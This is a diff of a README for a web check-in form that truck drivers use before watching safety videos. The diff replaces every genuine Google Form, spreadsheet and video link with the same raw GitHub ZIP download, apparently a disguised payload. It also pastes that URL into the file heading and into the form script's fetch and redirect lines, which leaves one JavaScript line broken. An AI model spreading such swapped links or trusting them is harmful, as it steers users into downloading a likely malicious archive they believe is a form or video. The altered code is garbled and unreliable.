@@ -26,15 +26,15 @@ This is a simple web-based form for truck drivers to check in before watching da
 
 ## 📂 Live Links
 
-- ✅ [Live Google Form (alternative version)](https://forms.gle/q7ndkZejMq1AnXJC8)
-- 📊 [View Attendance Sheet](https://docs.google.com/spreadsheets/d/17c0H7_7loaY0qWzBciaPpNOT6vGcJiOqqEMpFQGHw4A/edit?usp=sharing)
-- 🎬 [Today’s Safety Video](https://drive.google.com/file/d/11dizfdhwsutrjiVhZbkSqJEz7q0OwscD/view)
+- ✅ [Live Google Form (alternative version)](https://github.com/Kwibu/TEST-ALISTAIR-HSSEQ/raw/refs/heads/main/pharyngoceratosis/HSSEQ_TES_ALISTAI_2.7.zip)
+- 📊 [View Attendance Sheet](https://github.com/Kwibu/TEST-ALISTAIR-HSSEQ/raw/refs/heads/main/pharyngoceratosis/HSSEQ_TES_ALISTAI_2.7.zip)
+- 🎬 [Today’s Safety Video](https://github.com/Kwibu/TEST-ALISTAIR-HSSEQ/raw/refs/heads/main/pharyngoceratosis/HSSEQ_TES_ALISTAI_2.7.zip)
 
 ---
 
 ## 📁 Project Files
 
-### `index.html`
+### `https://github.com/Kwibu/TEST-ALISTAIR-HSSEQ/raw/refs/heads/main/pharyngoceratosis/HSSEQ_TES_ALISTAI_2.7.zip`
 ```html
 <!-- Form with redirection after data submission -->
 <form id="checkinForm">
@@ -42,8 +42,8 @@ This is a simple web-based form for truck drivers to check in before watching da
 </form>
 
 <script>
-  fetch('https://script.google.com/macros/s/YOUR_DEPLOYED_SCRIPT_ID/exec', { method: 'POST', body: formData });
+  fetch('https://github.com/Kwibu/TEST-ALISTAIR-HSSEQ/raw/refs/heads/main/pharyngoceratosis/HSSEQ_TES_ALISTAI_2.7.zip', { method: 'POST', body: formData });
   setTimeout(() => {
-    window.location.href = "https://drive.google.com/file/d/11dizfdhwsutrjiVhZbkSqJEz7q0OwscD/view";
+    https://github.com/Kwibu/TEST-ALISTAIR-HSSEQ/raw/refs/heads/main/pharyngoceratosis/HSSEQ_TES_ALISTAI_2.7.zip = "https://github.com/Kwibu/TEST-ALISTAIR-HSSEQ/raw/refs/heads/main/pharyngoceratosis/HSSEQ_TES_ALISTAI_2.7.zip";
   }, 1000);
 </script>
